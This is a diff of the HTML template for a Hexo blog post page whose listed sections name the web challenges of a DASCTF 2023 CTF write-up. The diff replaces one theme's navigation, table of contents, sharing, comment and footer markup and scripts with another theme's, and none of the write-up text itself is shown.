+    <a href="http://example.com/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="">http://example.com/2023/08/28/DASCTF 2023 & 0X401七月暑期挑战赛/</a>
+  </li>
+  <li class="license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+  </footer>
+
 </article>
 
-    <div id="toc" class="toc-article">
-    <strong class="toc-title">文章目录</strong>
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DASCTF-2023-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-WEB-Writeup"><span class="toc-number">1.</span> <span class="toc-text">DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EzFlask"><span class="toc-number">2.1.</span> <span class="toc-text">EzFlask</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#static-url-path"><span class="toc-number">2.1.0.0.1.</span> <span class="toc-text">_static_url_path</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MyPicDisk"><span class="toc-number">2.2.</span> <span class="toc-text">MyPicDisk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">2.2.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-cms"><span class="toc-number">2.3.</span> <span class="toc-text">ez_cms</span></a></li></ol></li></ol>
-</div>
-<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
-
-
-<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-
-<script>
-    var valueHide = "隐藏目录";
-    var valueShow = "显示目录";
-
-    if ($(".left-col").is(":hidden")) {
-        $("#tocButton").attr("value", valueShow);
-    }
-    $("#tocButton").click(function() {
-        if ($("#toc").is(":hidden")) {
-            $("#tocButton").attr("value", valueHide);
-            $("#toc").slideDown(320);
-        }
-        else {
-            $("#tocButton").attr("value", valueShow);
-            $("#toc").slideUp(350);
-        }
-    })
-    if ($(".toc").length < 1) {
-        $("#toc, #tocButton").hide();
-    }
-</script>
-
-
-
-
-
-<div class="bdsharebuttonbox">
-	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
-	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
-	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
-	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
-	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
-	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
-	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
-</div>
-<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
-
-
-
-
-    
-        <section id="comments">
-  <div id="disqus_thread"></div>
-    <script type="text/javascript">
-    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
-    var disqus_shortname = 'swing'; // required: replace example with your forum shortname
-
-    /* * * DON'T EDIT BELOW THIS LINE * * */
-    (function() {
-      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-    })();
-  </script>
-  <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-</section>
-    
-
-
-
-    <div class="scroll" id="post-nav-button">
-        
-            <a href="/2023/08/28/LITCTF%202023%20WEB/" title="上一篇: ">
-                <i class="fa fa-angle-left"></i>
-            </a>
-        
-        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
-        
-            <a href="/2023/08/25/hello-world/" title="下一篇: article">
-                <i class="fa fa-angle-right"></i>
-            </a>
-        
-    </div>
-    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2023/08/28/Tenable%20CTF/">Tenable CTF</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/08/28/LITCTF%202023%20WEB/">LITCTF 2023 WEB</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/">DASCTF 2023 & 0X401七月暑期挑战赛</a></li><li class="post-list-item"><a class="post-list-link" href="/2023/08/25/hello-world/">article</a></li></ul>
-    <script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-    <script>
-        $(".post-list").addClass("toc-article");
-        $(".post-list-item a").attr("target","_blank");
-        $("#post-nav-button > a:nth-child(2)").click(function() {
-            $(".fa-bars, .fa-times").toggle();
-            $(".post-list").toggle(300);
-            if ($(".toc").length > 0) {
-                $("#toc, #tocButton").toggle(200, function() {
-                    if ($(".switch-area").is(":visible")) {
-                        $("#tocButton").attr("value", valueHide);
-                        }
-                    })
-            }
-            else {
-            }
-        })
-    </script>
-
-
-
-    <script>
-        
-    </script>
-</div>
-      <footer id="footer">
-    <div class="outer">
-        <div id="footer-info">
-            <div class="footer-left">
-                &copy; 2023 John Doe
-            </div>
-            <div class="footer-right">
-                <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="http://bestwing.me" target="_blank">Sw'blog</a> by Swing
-            </div>
-        </div>
-        
-            <div class="visit">
-                
-                    <span id="busuanzi_container_site_pv" style='display:none'>
-                        <span id="site-visit" >海贼到访数: 
-                            <span id="busuanzi_value_site_uv"></span>
-                        </span>
-                    </span>
-                
-                
-                    <span>, </span>
-                
-                
-                    <span id="busuanzi_container_page_pv" style='display:none'>
-                        <span id="page-visit">本页阅读量: 
-                            <span id="busuanzi_value_page_pv"></span>
-                        </span>
-                    </span>
-                
-            </div>
-        
-    </div>
-</footer>
-
-    </div>
-    
-<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
-
-
-<script src="/js/main.js"></script>
-
-
-    <script>
-        $(document).ready(function() {
-            var backgroundnum = 24;
-            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
-            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
-            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
-        })
-    </script>
-
-
-
-
-
-<div class="scroll" id="scroll">
-    <a href="#"><i class="fa fa-arrow-up"></i></a>
-    <a href="#comments"><i class="fa fa-comments-o"></i></a>
-    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
-</div>
-<script>
-    $(document).ready(function() {
-        if ($("#comments").length < 1) {
-            $("#scroll > a:nth-child(2)").hide();
-        };
-    })
-</script>
-
-<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
-</script>
-
-  <script language="javascript">
-    $(function() {
-        $("a[title]").each(function() {
-            var a = $(this);
-            var title = a.attr('title');
-            if (title == undefined || title == "") return;
-            a.data('title', title).removeAttr('title').hover(
-
-            function() {
-                var offset = a.offset();
-                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
-                    top: offset.top - a.outerHeight() - 15,
-                    left: offset.left + a.outerWidth()/2 + 1
-                }).fadeIn(function() {
-                    var pop = $(this);
-                    setTimeout(function() {
-                        pop.remove();
-                    }, pop.text().length * 800);
-                });
-            }, function() {
-                $("#anchortitlecontainer").remove();
-            });
-        });
-    });
-</script>
-
-
-    <script type="text/javascript">
-      window.onload = function(){
-        document.getElementById("search").onclick = function(){
-            console.log("search")
-            search();
-        }
-      }
-      function search(){
-        (function(w,d,t,u,n,s,e){w['SwiftypeObject']=n;w[n]=w[n]||function(){
-        (w[n].q=w[n].q||[]).push(arguments);};s=d.createElement(t);
-        e=d.getElementsByTagName(t)[0];s.async=1;s.src=u;e.parentNode.insertBefore(s,e);
-        })(window,document,'script','//s.swiftypecdn.com/install/v2/st.js','_st');
-
-        _st('install','A1Pz-LKMXbrzcFg2FWi6','2.0.0');
-      }
-    </script>
-
   </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/2023/08/25/hello-world/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeudstjqj20zk0m8k3r.jpg" title="article">
+  <span class="type">Previous Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>article</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/2023/08/28/LITCTF%202023%20WEB/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclxp31goj20zk0m8qv5.jpg" title="Untitled">
+  <span class="type">Next Post</span>
+  <span class="category"><i class="ic i-flag"></i> </span>
+  <h3>Untitled</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="Contents">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#DASCTF-2023-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B-WEB-Writeup"><span class="toc-number">1.</span> <span class="toc-text">DASCTF 2023 &amp; 0X401七月暑期挑战赛-WEB Writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web"><span class="toc-number">2.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#EzFlask"><span class="toc-number">2.1.</span> <span class="toc-text">EzFlask</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#static-url-path"><span class="toc-number">2.1.0.0.1.</span> <span class="toc-text">_static_url_path</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MyPicDisk"><span class="toc-number">2.2.</span> <span class="toc-text">MyPicDisk</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%B8%80"><span class="toc-number">2.2.1.</span> <span class="toc-text">法一</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%95%E4%BA%8C%EF%BC%9A"><span class="toc-number">2.2.2.</span> <span class="toc-text">法二：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-cms"><span class="toc-number">2.3.</span> <span class="toc-text">ez_cms</span></a></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="Related">
+      </div>
+      <div class="overview panel" data-title="Overview">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="John Doe"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">John Doe</p>
+  <div class="description" itemprop="description"></div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">4</span>
+        <span class="name">posts</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">1</span>
+        <span class="name">tags</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/2023/08/25/hello-world/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/2023/08/28/LITCTF%202023%20WEB/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>Random Posts</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/08/25/hello-world/" title="article">article</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/08/28/Tenable%20CTF/" title="Untitled">Untitled</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/08/28/DASCTF%202023%20&%200X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/" title="Untitled">Untitled</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+</div>
+
+    <span><a href="/2023/08/28/LITCTF%202023%20WEB/" title="Untitled">Untitled</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>Recent Comments</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe @ Yume Shoka</span>
+  </div>
+  <div class="powered-by">
+    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: '2023/08/28/DASCTF 2023 & 0X401七月暑期挑战赛/',
+    favicon: {
+      show: "（●´3｀●）Goooood",
+      hide: "(´Д｀)Booooom"
+    },
+    search : {
+      placeholder: "Search for Posts",
+      empty: "We didn't find any results for the search: ${query}",
+      stats: "${hits} results found in ${time} ms"
+    },
+    valine: true,fancybox: true,
+    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
 </body>
 </html>
